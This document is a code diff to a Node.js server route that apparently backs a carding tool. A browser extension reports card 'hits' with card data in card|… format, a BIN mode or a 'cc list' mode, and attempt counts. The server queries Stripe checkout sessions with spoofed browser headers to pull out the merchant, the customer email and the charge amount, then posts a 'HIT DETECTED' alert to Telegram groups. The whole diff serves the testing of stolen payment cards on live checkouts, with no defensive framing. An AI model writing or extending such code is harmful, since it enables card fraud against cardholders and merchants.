@@ -585,7 +585,7 @@ router.post('/notify-hit', async (req, res) => {
   let fullCheckoutUrl = '—';
 
   // Extract merchant name - prioritize business_url, then auto-fetch from checkout URL, then URL detection, then BIN detection
-  let merchantName = 'Payment Processor'; // Default
+  let merchantName = 'Unknown Merchant'; // Default
   console.log('[HIT_NOTIFICATION] Extension data - current_url:', current_url, 'merchant_url:', merchant_url, 'business_url:', business_url);
 
   // Priority 1: business_url (exact merchant from Stripe checkout session - sent by extension)
@@ -636,6 +636,7 @@ router.post('/notify-hit', async (req, res) => {
         });
 
         if (response.status === 200 && response.data) {
+          // Extract merchant info
           if (response.data.account_settings && response.data.account_settings.business_url) {
             const businessUrl = response.data.account_settings.business_url;
             merchantName = businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
@@ -646,6 +647,48 @@ router.post('/notify-hit', async (req, res) => {
           } else {
             console.log('[HIT_NOTIFICATION] ⚠️ CC SCRIPT: API call successful but no merchant data found');
             merchantName = 'Stripe Checkout';
+          }
+
+          // Extract customer email if not provided by extension
+          if (emailDisplay === '—' && response.data.customer_email) {
+            emailDisplay = response.data.customer_email;
+            console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Email extracted as:', emailDisplay);
+          }
+
+          // Extract amount for personal message if we have checkout data
+          // Try different amount fields depending on checkout type
+          let amountCents = null;
+          let currency = 'USD';
+
+          // Prefer USD equivalent if available
+          if (response.data.line_item_group && response.data.line_item_group.localized_prices_metas) {
+            const usdMeta = response.data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
+            if (usdMeta && usdMeta.total) {
+              amountCents = usdMeta.total;
+              currency = 'USD';
+              console.log('[HIT_NOTIFICATION] ✅ Using USD equivalent amount');
+            }
+          }
+
+          // Fallback to checkout currency amounts
+          if (amountCents === null) {
+            if (response.data.amount_total) {
+              amountCents = response.data.amount_total;
+            } else if (response.data.line_item_group && response.data.line_item_group.total) {
+              amountCents = response.data.line_item_group.total;
+            } else if (response.data.recurring_details && response.data.recurring_details.total) {
+              amountCents = response.data.recurring_details.total;
+            }
+
+            if (response.data.currency) {
+              currency = response.data.currency.toUpperCase();
+            }
+          }
+
+          if (amountCents !== null) {
+            const amountDollars = (amountCents / 100).toFixed(2);
+            displayAmount = `$${amountDollars}`;
+            console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Amount extracted as:', displayAmount, `(${currency})`);
           }
         } else {
           console.log('[HIT_NOTIFICATION] ❌ CC SCRIPT: API call failed with status:', response.status);
@@ -716,63 +759,11 @@ router.post('/notify-hit', async (req, res) => {
   // success_url is no longer sent by extension - simplified processing
   console.log('[Telegram] success_url removed from extension payload');
   const cardDisplay = (card && card.trim()) ? card.replace(/\|/g, ' | ') : '—';
-  const emailDisplay = (email && String(email).trim()) || '—';
+  let emailDisplay = (email && String(email).trim()) || '—';
   const timeDisplay = (time_sec != null && time_sec !== '') ? `${time_sec}s` : '—';
 
-  // For extension hits, try to get amount from checkout URL if available
+  // displayAmount is now set from the merchant extraction logic above
   let displayAmount = amtFormatted;
-  if (current_url && current_url.includes('checkout.stripe.com')) {
-    try {
-      console.log('[HIT_NOTIFICATION] Attempting to extract amount from checkout URL for personal message');
-      const parsedUrl = parseCheckoutUrl(current_url);
-      if (parsedUrl.success && parsedUrl.publicKey) {
-        const apiUrl = `https://api.stripe.com/v1/payment_pages/${parsedUrl.sessionId}?key=${parsedUrl.publicKey}&eid=NA`;
-
-        const response = await new Promise((resolve, reject) => {
-          const request = https.get(apiUrl, {
-            headers: {
-              'accept': 'application/json',
-              'accept-language': 'en',
-              'cache-control': 'no-cache',
-              'content-type': 'application/x-www-form-urlencoded',
-              'origin': 'https://checkout.stripe.com',
-              'referer': 'https://checkout.stripe.com/',
-              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            timeout: 15000
-          }, (res) => {
-            let data = '';
-            res.on('data', (chunk) => data += chunk);
-            res.on('end', () => {
-              try {
-                resolve({ status: res.statusCode, data: JSON.parse(data) });
-              } catch (e) {
-                resolve({ status: res.statusCode, data: null, error: e.message });
-              }
-            });
-          });
-          request.on('error', (error) => reject(error));
-          request.on('timeout', () => {
-            request.destroy();
-            reject(new Error('Timeout'));
-          });
-        });
-
-        if (response.status === 200 && response.data) {
-          // Extract amount from checkout session
-          if (response.data.currency && response.data.amount_total) {
-            const currency = response.data.currency.toUpperCase();
-            const amountCents = response.data.amount_total;
-            const amountDollars = (amountCents / 100).toFixed(2);
-            displayAmount = `$${amountDollars}`;
-            console.log('[HIT_NOTIFICATION] ✅ Extracted amount for personal message:', displayAmount);
-          }
-        }
-      }
-    } catch (error) {
-      console.error('[HIT_NOTIFICATION] ❌ Error extracting amount for personal message:', error.message);
-    }
-  }
 
   const hitText = `🎯 <b>HIT DETECTED</b>\n` +
     `─────────────────\n\n` +
@@ -799,13 +790,26 @@ router.post('/notify-hit', async (req, res) => {
 
   const cleanCard = cardDisplay !== '—' ? cardDisplay.replace(' | ', '').replace(/\s/g, '') : '';
 
-  // Determine BIN mode: if card data is exactly 6 digits (BIN only), it's BIN mode
-  // If it has more data (like full card), it's CC list mode
+  // Determine BIN mode based on card data format
   let binMode = '(extension hit)';
-  if (cleanCard && cleanCard.length === 6 && /^\d{6}$/.test(cleanCard)) {
-    binMode = '(Bin Mode)';
-  } else if (cleanCard && cleanCard.length > 6) {
-    binMode = '(cc list)';
+  if (cleanCard) {
+    // If card data is exactly 6 digits, it's BIN mode (user hit with BIN)
+    if (cleanCard.length === 6 && /^\d{6}$/.test(cleanCard)) {
+      binMode = '(Bin Mode)';
+    }
+    // If card data is longer than 6 digits, it's CC list mode (extract BIN from full card)
+    else if (cleanCard.length > 6) {
+      binMode = '(cc list)';
+    }
+  }
+
+  // Extract real amount from displayAmount for groups (remove $ and get number)
+  let realAmount = '0.00';
+  if (displayAmount && displayAmount !== 'Free Trial' && displayAmount !== '—') {
+    const amountMatch = displayAmount.match(/[\d.]+/);
+    if (amountMatch) {
+      realAmount = parseFloat(amountMatch[0]).toFixed(2);
+    }
   }
 
   const hitData = {
@@ -815,7 +819,7 @@ router.post('/notify-hit', async (req, res) => {
     bin: cleanCard ? extractBinFromCard(cleanCard) : 'Unknown',
     binMode: binMode,
     email: emailDisplay !== '—' ? emailDisplay : null,
-    amount: amtFormatted === 'Free Trial' ? '0.00' : amtFormatted.replace('₹', '').replace(/[^\d.]/g, ''),
+    amount: realAmount,
     attempts: attempts || 1,
     timeTaken: timeDisplay,
     merchant: merchantName // Use extracted merchant name
